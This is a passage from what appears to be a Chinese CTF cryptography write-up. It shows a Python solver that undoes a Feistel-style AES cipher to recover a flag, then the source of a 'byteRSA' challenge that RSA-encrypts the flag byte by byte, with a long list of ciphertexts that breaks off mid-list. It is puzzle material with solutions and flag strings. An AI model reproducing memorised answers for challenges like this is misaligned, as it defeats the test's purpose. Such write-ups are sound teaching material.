class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>ReSubchart = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>,<span class="hljs-number">0xfb</span>,<br>            <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>,<span class="hljs-number">0xcb</span>,<br>            <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>,<span class="hljs-number">0x4e</span>,<br>            <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>,<span class="hljs-number">0x25</span>,<br>            <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>,<span class="hljs-number">0x92</span>,<br>            <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>,<span class="hljs-number">0x84</span>,<br>            <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>,<span class="hljs-number">0x06</span>,<br>            <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>,<span class="hljs-number">0x6b</span>,<br>            <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>,<span class="hljs-number">0x73</span>,<br>            <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>,<span class="hljs-number">0x6e</span>,<br>            <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>,<span class="hljs-number">0x1b</span>,<br>            <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>,<span class="hljs-number">0xf4</span>,<br>            <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>,<span class="hljs-number">0x5f</span>,<br>            <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>,<span class="hljs-number">0xef</span>,<br>            <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>,<span class="hljs-number">0x61</span>,<br>            <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>,<span class="hljs-number">0x7d</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">plaintext, keystream</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(plaintext) == <span class="hljs-number">32</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(keystream) == <span class="hljs-number">48</span><br><br>    left = plaintext[:<span class="hljs-number">16</span>]<br>    right = plaintext[<span class="hljs-number">16</span>:]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-comment">#print(keystream[(2-i) * 16:(2-i) * 16 + 16])</span><br>        aes = AES.new(keystream[(<span class="hljs-number">2</span>-i) * <span class="hljs-number">16</span>:(<span class="hljs-number">2</span>-i) * <span class="hljs-number">16</span> + <span class="hljs-number">16</span>], AES.MODE_ECB)<br>        <span class="hljs-comment">#print(left)</span><br>        <span class="hljs-comment">#print(right)</span><br>        new_right=left<br>        new_left=long_to_bytes(bytes_to_long(aes.encrypt(new_right)) ^ bytes_to_long(right))<br>        left=new_left<br>        right=new_right<br>    <span class="hljs-keyword">return</span> left + right<br><br><span class="hljs-comment">#788a9b46b757c57fd10f915d1eac078d16c2e4137b17507ebc0df94de1b49f30</span><br>c=<span class="hljs-string">&#x27;788a9b46b757c57fd10f915d1eac078d16c2e4137b17507ebc0df94de1b49f30&#x27;</span><br><span class="hljs-comment">#print(len(c))</span><br>c=<span class="hljs-built_in">int</span>(c,<span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">32</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-comment">#print(list(c))</span><br>c=[ReSubchart[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c]<br><span class="hljs-comment">#print(c)</span><br>key=<span class="hljs-string">b&#x27;Do_you_like_Feistel_I_like_AES_This_is_your_flag&#x27;</span><br>c=<span class="hljs-built_in">bytes</span>(c)<br><span class="hljs-comment">#print(c)</span><br>d=decrypt(c,key)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment">#print(d.hex())</span><br></code></pre></td></tr></table></figure><h2 id="3-byteRSA"><a href="#3-byteRSA" class="headerlink" title="3.byteRSA"></a>3.byteRSA</h2><p>题目描述：flag格式为flag{}内容为uuid4格式</p><p>提示：题目未给出n，可结合已知明文攻击求出n</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>e = <span class="hljs-number">65537</span><br><br>cipher = []<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> flag:<br>    cipher.append(<span class="hljs-built_in">pow</span>(ch,e,n))<br><span class="hljs-built_in">print</span>(cipher)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013, 4765275407078498830196453484615228647488119641051736386985124149771978793497825138811053264203464751611510602323328935055577934271194521578877734816701450882508975992711707365171446549350693616777156594559459359020681650457462997348341819337696857465215645867795933319433993806850657310771271780164857576249640499530706002807800072095279478191010627657160045263503510815828909783017871488780847009274255795618370702341262906675889960484872121593942090158785279482041251686692965598428699984795425424314845202821178882038752009686267978535447957338296568313474048161414021947114767992819220821921113419208368413263422, 8973390961455272052267628415841725148664014460598979414622203552505218520214743532403244304953555243556170777579306356620696458273374315586751949961843795539869690154234642403811934490726142262657134153207125693127589115572361182800281824586334537572060829713380809862704154400013755951085823840399392658480894558256977957471063971590417676730357273323411948303311010803091423319721802243327738203279168144733854954817333787104587761363460759530221526096663878048045665893439723821743634777948744336977023942482077160731957626238615947965693867523748036438735812823764360683309162662213075339182302561433502244315618, 15350733069829204402920295477711380341993062041251941490292749372749852236874047486052195072132113874647900550920373937658068265963230191744711614878751153046262497821806700880691844111230197714824626417009021627730693326236996457280638193712265028105287892407764356957055246585368960863525117367721015371334890353785285138290449449040298696396527786884238041078994224964407918419983364650072064009385080123333851106203047596834434300883391225870572762795102562384842292433334404864939630326550107936082575285024893679013349011338224644982643827594922553767254028893305803129888420355793710431322859736273982489816996, 4249373777588248671367805334161493007259542293334721053812535082529969776053394649471974449756301276663961653819139865824142355133200769538771524743248806027627082548193510500721182481899659358546225484367576894946375803888338888199469819956944303404505805643529314823810356948217197816571956131508907963784862292141456747364036520172036499072834743141526316790310038291316979993946838442642063654429242625413862965256433996723276080780358623683201705451079492393133681688362013434540679024214022109083304008364344767019959162604852916671072909369436496532197699383614425869981081966164258626590576379292275701825189, 9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013, 19654595171654315158213936501048512290856391907074545164555633962365612472660258228301419361260282318699128465207796192578531872797199277705764911662741276841556125935317753083359300751109552146647391777837899540472601397813586411488753524464397475907518425178882776703281902159775206954942057948561706307293218080487445951237384356353793535370798514636293597528638968612324893712282419701312648224399984583358712458416093648210250912171230390790331796943208689964252106034986162388312208275122970182239540689210368540167180735615484225214910210233327467684273883519776106558578072694286638466552994831654174381044835, 12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365, 9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013, 3635275278635183549315022314865300211107333953729618262620788640006014274612765983632230202336333218753735628827913708368013373911993754752994660420696665597055513006156595151988934434020835871294494877212205850772549738485856720555285620770589013582496766873590818202601671885261630424587168761017486668153633265039658437266274931790905539730063394326439085221358298442653655228907783473187740098052820249826308157628672669593263612129847867064246914683866041495687954050237769621483628469862966415747065181757022201021890571077307495722753377609616728101524229243469807003327904966503543940968901246881814374519027, 12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365, 19000555934585529305683392170381989320002451476828893690357718573608042557901262756594196097528218937377609939316690404016167547903158163914228535012281839169884103507554723850079193575039971117647459690537834051905504887886595023030085094604051410575710199490600927943831568523585523966550185816979665559642112504959207077847724745354761305124094475791537910083182441197600792102145078372769161366865835856070659742420903182775410372048316153156291377083922967959387384292365604396586364739015931010832012831735797525897307867227802077790973909455077192267492384110127651647949524981637309137897589614882856413134661, 17355773236729857323973342270052932822776443181350794115049274957572288992149418748086412749640634322969667852979516339666069836889497662051707223971996474107301073353349805595306420750337055575352283687879536718629164618796052047039628701931372309406301831041874201982276726848874988401287919319534744275696993626882472379524870013839308536247015281793879284940799318433542493865938111850258587184638110018166008717897412067757141722069237202689456423801977653539902597384820747728892037622013840313499223113832787246844644302233184877085683753398108033875101523308410923910391992192367470124409629413684235827401101, 5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409, 8973390961455272052267628415841725148664014460598979414622203552505218520214743532403244304953555243556170777579306356620696458273374315586751949961843795539869690154234642403811934490726142262657134153207125693127589115572361182800281824586334537572060829713380809862704154400013755951085823840399392658480894558256977957471063971590417676730357273323411948303311010803091423319721802243327738203279168144733854954817333787104587761363460759530221526096663878048045665893439723821743634777948744336977023942482077160731957626238615947965693867523748036438735812823764360683309162662213075339182302561433502244315618, 3859959482980546272964041592677926326788734736813617460803112586887098470080689434694471240865737650206168444216169499393640775949766555842072533704694795133145770551685535438097745653486049958298857152048237100954025937597878134246565351033559913570963855392261375619388940130942631975527263102868836154113702012207407818544301966325323961143046903984302457861056914315343413937927125305404082933471280566632366457819963060445878461589707548495009155606847481503043605966599425677497274162192785494638975632832069752974461460132097911872311537539885671550638001598753535405480154079908206385289489275459229906552057, 19654595171654315158213936501048512290856391907074545164555633962365612472660258228301419361260282318699128465207796192578531872797199277705764911662741276841556125935317753083359300751109552146647391777837899540472601397813586411488753524464397475907518425178882776703281902159775206954942057948561706307293218080487445951237384356353793535370798514636293597528638968612324893712282419701312648224399984583358712458416093648210250912171230390790331796943208689964252106034986162388312208275122970182239540689210368540167180735615484225214910210233327467684273883519776106558578072694286638466552994831654174381044835, 19541389876845937343104174024011174738121582937765475620122801498154028082973444987539224097699623805950895389563205017470303467902732740685141223948133114441189902477943284761342153435208627535205000112301279059116718341374015808979933207842606066504198356735729482401379793585473914765882931794445052408034667492129524814885390117447168945036497206397204622589955300040717645565917707064969320291258722568342575672468731777880446082197946095551569690181986308352939371815648033417588567436731143727846893380585995821169243246578354856161235175509599914817583342574163019305560736028387187751212923707831738520468619, 5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409, 10788595185853874250291337066031363719532165972152022247230756606168458513957901058267448230552069458296728306849344055365621140817689640272508695426725708991076683904959288139244667809213349187982089861290671799168933798128795390846176612821114516268881609010883097495433437815000067002681532459618320819014787645206016302741493146640426833757786432090306333486096069636012389767907433313022127305406871010623331311088179874132685290362909101935736195019027586102391508113258495217011090318875518809015771394328011308419705662015852545645365444877472509590058704853194148009194682279505412785412321259650082946504615, 11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013, 11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013, 12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365, 5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409, 1966051342253428126867036550911377588176062991978050151556220996966820367011493867712498963079481596568071731019471124371764175475269270008316413930914172651469330538676789619100982128052154168600577686568618368748109639619262262762578488936962488289364690039029892248888117290016845609036187623151577166054538068196197473606013134518323873786325904642286659354300685572005304468480149854980819019976872903106847397303566962121969346000684913201236927538303048221994495669917422710280271668440229600149250984619106386452760578946000175959652594393760857007932236451072213235889616254917671039080374828794956473992137, 3635275278635183549315022314865300211107333953729618262620788640006014274612765983632230202336333218753735628827913708368013373911993754752994660420696665597055513006156595151988934434020835871294494877212205850772549738485856720555285620770589013582496766873590818202601671885261630424587168761017486668153633265039658437266274931790905539730063394326439085221358298442653655228907783473187740098052820249826308157628672669593263612129847867064246914683866041495687954050237769621483628469862966415747065181757022201021890571077307495722753377609616728101524229243469807003327904966503543940968901246881814374519027, 11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013, 8036115345158284474471397254807283266614614121743628483142557473269859898412290012891221484105977251019649903506196189946673222255281452613039087299351374625004810322992499276849659048953831983808571810413875419893692857244036929376849148890693973718372460762932593837217029662865217992090551413847287555846490173491344657373331793306347668493788788142206894611528091044960842285913251431599677455010357230713934669773980706349466425243400033937252603911175760751911576371407935700571967997143623735532177897923751597788914241916742615015830790145085701278392064206627458483137578085984012973561401653228823844995780, 5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409, 11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013, 9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013, 3635275278635183549315022314865300211107333953729618262620788640006014274612765983632230202336333218753735628827913708368013373911993754752994660420696665597055513006156595151988934434020835871294494877212205850772549738485856720555285620770589013582496766873590818202601671885261630424587168761017486668153633265039658437266274931790905539730063394326439085221358298442653655228907783473187740098052820249826308157628672669593263612129847867064246914683866041495687954050237769621483628469862966415747065181757022201021890571077307495722753377609616728101524229243469807003327904966503543940968901246881814374519027, 7934100103612597799245966597540495770897459791305838611829168994366810176791478598127716585330973646572837963298347658217379594571851959822994361520143179602103117537841241957973806470431906980460647842956485908090628629220959042190163158423738015941306847049970180609905770726803957931803238333424331924772396704354166351537990669395857986219625312635050536080414161783157936667067773822631179948661311776327691342487942038364859476351251573618170116210483990759571565644168725706584601160447812736785763159328694343724189559744117144218446759634528879553618996488152154132459276180950902943439672009222655263294592, 1966051342253428126867036550911377588176062991978050151556220996966820367011493867712498963079481596568071731019471124371764175475269270008316413930914172651469330538676789619100982128052154168600577686568618368748109639619262262762578488936962488289364690039029892248888117290016845609036187623151577166054538068196197473606013134518323873786325904642286659354300685572005304468480149854980819019976872903106847397303566962121969346000684913201236927538303048221994495669917422710280271668440229600149250984619106386452760578946000175959652594393760857007932236451072213235889616254917671039080374828794956473992137, 12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365, 10938776239912765586783245351675229316504975576866998685503586605561184435751049074246836816500718587784612469841616634843475000062466229478181842615745696699467399548336525284294887073685319159778641442405442489137290300401315830312684605395059339571269423637238744539444880428814659023673423480506866516527471293169451239948711899801093670224684408482463920460246668037760069839988494786949189538209188928839999072601239111365274070174948297336900113846678177315959484645286661230420476535393405982415166174713901838194389026469820973958391461098831028082983440806187768356311218898932776087634026785114354421118702, 9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013, 19654595171654315158213936501048512290856391907074545164555633962365612472660258228301419361260282318699128465207796192578531872797199277705764911662741276841556125935317753083359300751109552146647391777837899540472601397813586411488753524464397475907518425178882776703281902159775206954942057948561706307293218080487445951237384356353793535370798514636293597528638968612324893712282419701312648224399984583358712458416093648210250912171230390790331796943208689964252106034986162388312208275122970182239540689210368540167180735615484225214910210233327467684273883519776106558578072694286638466552994831654174381044835, 9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013, 19541389876845937343104174024011174738121582937765475620122801498154028082973444987539224097699623805950895389563205017470303467902732740685141223948133114441189902477943284761342153435208627535205000112301279059116718341374015808979933207842606066504198356735729482401379793585473914765882931794445052408034667492129524814885390117447168945036497206397204622589955300040717645565917707064969320291258722568342575672468731777880446082197946095551569690181986308352939371815648033417588567436731143727846893380585995821169243246578354856161235175509599914817583342574163019305560736028387187751212923707831738520468619, 